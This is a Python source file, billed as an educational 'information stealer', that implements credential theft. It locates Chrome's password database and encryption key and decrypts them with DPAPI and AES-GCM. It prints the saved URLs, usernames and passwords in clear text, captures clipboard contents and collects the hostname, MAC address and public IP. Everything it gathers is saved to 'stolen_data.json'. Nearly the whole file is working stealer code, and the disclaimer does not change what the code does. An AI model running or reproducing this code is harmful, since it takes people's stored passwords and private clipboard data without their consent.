"""
Information Stealer - Educational Project
=========================================
This script demonstrates how attackers extract sensitive information from systems.
FOR EDUCATIONAL PURPOSES ONLY - Understanding vulnerabilities to improve security.

Components:
1. Chrome Password Extraction
2. Clipboard Data Capture
3. System Information Gathering
"""

import os
import json
import sqlite3
import base64
import shutil
import subprocess
import platform
import socket
import uuid
import requests
import pyperclip
from pathlib import Path

# Windows-specific imports for password decryption
try:
    import win32crypt
    from Crypto.Cipher import AES
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    print("Warning: Windows-specific modules not available. Password extraction may not work.")


class InformationStealer:
    """Main class for extracting sensitive information from the system."""
    
    def __init__(self):
        self.chrome_path = self._get_chrome_path()
        self.results = {
            'passwords': [],
            'clipboard': None,
            'system_info': {}
        }
    
    def _get_chrome_path(self):
        """Get Chrome's default data directory path."""
        if platform.system() == 'Windows':
            return Path(os.path.expanduser('~')) / 'AppData' / 'Local' / 'Google' / 'Chrome' / 'User Data'
        elif platform.system() == 'Darwin':  # macOS
            return Path(os.path.expanduser('~')) / 'Library' / 'Application Support' / 'Google' / 'Chrome'
        else:  # Linux
            return Path(os.path.expanduser('~')) / '.config' / 'google-chrome'
    
    def extract_chrome_passwords(self):
        """
        Extract and decrypt saved passwords from Google Chrome.
        
        Process:
        1. Locate Chrome's encrypted password database (Login Data)
        2. Extract encryption key from Local State file
        3. Decrypt passwords using Windows CryptUnprotectData or AES
        4. Return list of credentials
        """
        print("\n[+] Extracting Chrome Passwords...")
        
        if not WINDOWS_AVAILABLE:
            print("[-] Windows encryption modules not available. Skipping password extraction.")
            return []
        
        passwords = []
        
        try:
            # Path to Chrome's Login Data database
            login_db = self.chrome_path / 'Default' / 'Login Data'
            
            if not login_db.exists():
                print(f"[-] Chrome Login Data not found at: {login_db}")
                return []
            
            # Path to Local State (contains encryption key)
            local_state = self.chrome_path / 'Local State'
            
            if not local_state.exists():
                print(f"[-] Chrome Local State not found at: {local_state}")
                return []
            
            # Get the encryption key from Local State
            encryption_key = self._get_encryption_key(local_state)
            if not encryption_key:
                print("[-] Failed to retrieve encryption key")
                return []
            
            # Copy the database to a temporary location (Chrome locks it)
            temp_db = Path(os.path.expanduser('~')) / 'temp_login_db'
            try:
                shutil.copy2(login_db, temp_db)
            except Exception as e:
                print(f"[-] Failed to copy database: {e}")
                return []
            
            # Connect to the database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query saved passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                # Decrypt the password
                try:
                    if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                        # Chrome 80+ uses AES encryption
                        password = self._decrypt_password_aes(encrypted_password, encryption_key)
                    else:
                        # Older Chrome versions use Windows DPAPI
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                    
                    if password:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': password
                        })
                        print(f"[+] Found credentials for: {url}")
                except Exception as e:
                    print(f"[-] Failed to decrypt password for {url}: {e}")
                    continue
            
            conn.close()
            
            # Clean up temporary database
            try:
                os.remove(temp_db)
            except:
                pass
            
            print(f"[+] Extracted {len(passwords)} saved passwords")
            
        except Exception as e:
            print(f"[-] Error extracting passwords: {e}")
        
        return passwords
    
    def _get_encryption_key(self, local_state_path):
        """
        Extract the encryption key from Chrome's Local State file.
        
        Chrome stores the encryption key in Local State as a base64-encoded string.
        """
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Get the encrypted key
            encrypted_key = local_state['os_crypt']['encrypted_key']
            
            # Decode from base64
            encrypted_key = base64.b64decode(encrypted_key)
            
            # Remove 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using Windows DPAPI
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            return key
            
        except Exception as e:
            print(f"[-] Error getting encryption key: {e}")
            return None
    
    def _decrypt_password_aes(self, encrypted_password, key):
        """
        Decrypt password using AES-256-GCM (Chrome 80+).
        
        Format: v10 or v11 (version) + nonce (12 bytes) + ciphertext + tag (16 bytes)
        """
        try:
            # Skip version prefix (3 bytes)
            encrypted_password = encrypted_password[3:]
            
            # Extract nonce (12 bytes) and ciphertext
            nonce = encrypted_password[:12]
            ciphertext = encrypted_password[12:-16]
            tag = encrypted_password[-16:]
            
            # Create AES cipher
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            
            # Decrypt
            password = cipher.decrypt_and_verify(ciphertext, tag)
            
            return password.decode('utf-8')
            
        except Exception as e:
            print(f"[-] AES decryption error: {e}")
            return None
    
    def capture_clipboard(self):
        """
        Capture the current clipboard content.
        
        This can contain sensitive data like:
        - Passwords
        - Credit card numbers
        - Personal information
        - API keys
        """
        print("\n[+] Capturing Clipboard Data...")
        
        try:
            clipboard_data = pyperclip.paste()
            
            if clipboard_data:
                print(f"[+] Clipboard captured ({len(clipboard_data)} characters)")
                return clipboard_data
            else:
                print("[-] Clipboard is empty")
                return None
                
        except Exception as e:
            print(f"[-] Error capturing clipboard: {e}")
            return None
    
    def gather_system_info(self):
        """
        Gather comprehensive system information.
        
        Collects:
        - OS details
        - IP addresses (local and public)
        - MAC address
        - Hostname
        - Processor information
        """
        print("\n[+] Gathering System Information...")
        
        system_info = {}
        
        try:
            # Operating System Information
            system_info['os'] = {
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor()
            }
            print(f"[+] OS: {system_info['os']['system']} {system_info['os']['release']}")
            
            # Hostname
            system_info['hostname'] = socket.gethostname()
            print(f"[+] Hostname: {system_info['hostname']}")
            
            # MAC Address
            mac_int = uuid.getnode()
            mac = ':'.join(['{:02x}'.format((mac_int >> elements) & 0xff) 
                           for elements in range(0, 8*6, 8)][::-1])
            system_info['mac_address'] = mac
            print(f"[+] MAC Address: {system_info['mac_address']}")
            
            # Local IP Address
            try:
                # Connect to a remote address to determine local IP
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
                system_info['local_ip'] = local_ip
                print(f"[+] Local IP: {system_info['local_ip']}")
            except Exception as e:
                system_info['local_ip'] = "Unable to determine"
                print(f"[-] Could not determine local IP: {e}")
            
            # Public IP Address
            try:
                response = requests.get('https://api.ipify.org?format=json', timeout=5)
                if response.status_code == 200:
                    system_info['public_ip'] = response.json()['ip']
                    print(f"[+] Public IP: {system_info['public_ip']}")
                else:
                    system_info['public_ip'] = "Unable to determine"
            except Exception as e:
                system_info['public_ip'] = "Unable to determine"
                print(f"[-] Could not determine public IP: {e}")
            
            # Additional Network Information
            try:
                # Get all network interfaces and their IPs
                system_info['network_interfaces'] = []
                hostname = socket.gethostname()
                addr_info = socket.getaddrinfo(hostname, None)
                seen_ips = set()
                for addr in addr_info:
                    ip = addr[4][0]
                    if ip not in seen_ips and not ip.startswith('127.'):
                        seen_ips.add(ip)
                        system_info['network_interfaces'].append({
                            'ip': ip,
                            'family': 'IPv4' if addr[0] == socket.AF_INET else 'IPv6'
                        })
            except Exception as e:
                print(f"[-] Could not enumerate network interfaces: {e}")
            
        except Exception as e:
            print(f"[-] Error gathering system info: {e}")
        
        return system_info
    
    def save_results(self, filename='stolen_data.json'):
        """
        Save all extracted information to a JSON file.
        
        This simulates how attackers exfiltrate stolen data.
        """
        print(f"\n[+] Saving results to {filename}...")
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=4, ensure_ascii=False)
            print(f"[+] Results saved successfully")
        except Exception as e:
            print(f"[-] Error saving results: {e}")
    
    def display_results(self):
        """Display all extracted information in a formatted way."""
        print("\n" + "="*60)
        print("EXTRACTED INFORMATION SUMMARY")
        print("="*60)
        
        # Display Passwords
        print(f"\n[PASSWORDS] Found: {len(self.results['passwords'])}")
        for i, cred in enumerate(self.results['passwords'], 1):
            print(f"\n  {i}. URL: {cred['url']}")
            print(f"     Username: {cred['username']}")
            print(f"     Password: {cred['password']}")
        
        # Display Clipboard
        print(f"\n[CLIPBOARD]")
        if self.results['clipboard']:
            print(f"  Content: {self.results['clipboard'][:100]}...")
            if len(self.results['clipboard']) > 100:
                print(f"  (Truncated - Total length: {len(self.results['clipboard'])} characters)")
        else:
            print("  No clipboard data captured")
        
        # Display System Info
        print(f"\n[SYSTEM INFORMATION]")
        if self.results['system_info']:
            os_info = self.results['system_info'].get('os', {})
            print(f"  OS: {os_info.get('system', 'N/A')} {os_info.get('release', 'N/A')}")
            print(f"  Architecture: {os_info.get('architecture', 'N/A')}")
            print(f"  Hostname: {self.results['system_info'].get('hostname', 'N/A')}")
            print(f"  MAC Address: {self.results['system_info'].get('mac_address', 'N/A')}")
            print(f"  Local IP: {self.results['system_info'].get('local_ip', 'N/A')}")
            print(f"  Public IP: {self.results['system_info'].get('public_ip', 'N/A')}")
        
        print("\n" + "="*60)
    
    def run(self):
        """Execute all information extraction methods."""
        print("="*60)
        print("INFORMATION STEALER - EDUCATIONAL PROJECT")
        print("="*60)
        print("\n⚠️  WARNING: This tool is for educational purposes only!")
        print("   Understanding vulnerabilities helps improve security.\n")
        
        # Extract Chrome passwords
        self.results['passwords'] = self.extract_chrome_passwords()
        
        # Capture clipboard
        self.results['clipboard'] = self.capture_clipboard()
        
        # Gather system information
        self.results['system_info'] = self.gather_system_info()
        
        # Display results
        self.display_results()
        
        # Save results to file
        self.save_results()
        
        print("\n[+] Information extraction complete!")


def main():
    """Main entry point."""
    stealer = InformationStealer()
    stealer.run()


if __name__ == "__main__":
    main()

